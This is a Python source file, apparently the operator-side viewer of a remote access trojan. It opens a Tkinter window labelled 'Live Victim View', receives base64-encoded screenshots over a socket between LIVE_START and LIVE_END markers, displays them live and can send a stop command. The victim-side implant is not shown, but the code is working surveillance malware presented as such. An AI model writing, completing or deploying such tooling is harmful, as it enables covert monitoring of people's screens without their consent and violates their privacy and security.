import threading
import tkinter as tk
from PIL import Image, ImageTk
import io
import base64
import time
import socket
class LiveVictimGUI:
    def __init__(self, client_socket):
        self.client = client_socket
        self.running = True
        self.root = None
        self.setup()
    def setup(self):
        try:
            self.root = tk.Tk()
            self.root.title("Live Victim View - REAL TIME")
            self.root.geometry("900x700")
            self.root.configure(bg="black")
            self.canvas = tk.Canvas(
                self.root,
                bg="black",
                width=850,
                height=600
            )
            self.canvas.pack(pady=10)
            self.status = tk.Label(
                self.root,
                text="LIVE STREAMING - Victim's Screen",
                fg="red",
                bg="black",
                font=("Arial", 12, "bold")
            )
            self.status.pack()
            btn_frame = tk.Frame(self.root, bg="black")
            btn_frame.pack(pady=10)
            self.stop_btn = tk.Button(
                btn_frame,
                text="STOP STREAM",
                command=self.stop_view,
                bg="red",
                fg="white",
                padx=20,
                pady=5,
                font=("Arial", 10, "bold")
            )
            self.stop_btn.pack(side=tk.LEFT, padx=5)
            self.receive_thread = threading.Thread(
                target=self.receive_frames,
                daemon=True
            )
            self.receive_thread.start()
            self.root.protocol("WM_DELETE_WINDOW", self.stop_view)
            self.root.mainloop()
        except Exception as e:
            print(str(e))
    def receive_frames(self):
        try:
            buffer = b"" 
            while self.running:
                try:
                    data = self.client.recv(65536)
                    if not data:
                        break
                    buffer += data
                    while b"LIVE_START" in buffer and b"LIVE_END" in buffer:
                            try:
                                marker_start = b"LIVE_START\n"
                                marker_end = b"\nLIVE_END"
                                start = buffer.find(marker_start)
                                end = buffer.find(marker_end, start)
                                if start != -1 and end != -1:
                                    img_part = buffer[start + len(marker_start):end].strip()
                                    buffer = buffer[end + 9:]
                                    try:
                                        img_data = base64.b64decode(img_part)
                                        if len(img_data) < 100:
                                            raise ValueError("Invalid image data")
                                        image = Image.open(io.BytesIO(img_data))
                                        image = image.resize((850, 600), Image.Resampling.LANCZOS)
                                        photo = ImageTk.PhotoImage(image)
                                        self.root.after(0, self.update_image, photo)
                                    except Exception as e:
                                        print(str(e))
                            except Exception as e:
                                print(f"[DEBUG] Image decode error: {e}")
                                continue
                    time.sleep(0.01)
                except socket.timeout:
                    if not self.running:
                        break
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[ERROR] Receive failed: {e}")
                    break
            if self.running:
                self.root.after(0, self.stop_view)
        except Exception as e:
            print(str(e))
    def update_image(self, photo):
        if not self.running:
            return
        try:
            self.canvas.delete("all")
            self.canvas.create_image(425, 300, image=photo, anchor='center')
            self.canvas.image = photo 
            self.root.update_idletasks()
        except Exception as e:
            print(str(e))
    def stop_view(self):
        self.running = False
        try:
            self.client.send(b"stop\n")
        except Exception as e:
            print(str(e))
        try:
            self.root.destroy()
        except Exception as e:
            print(str(e))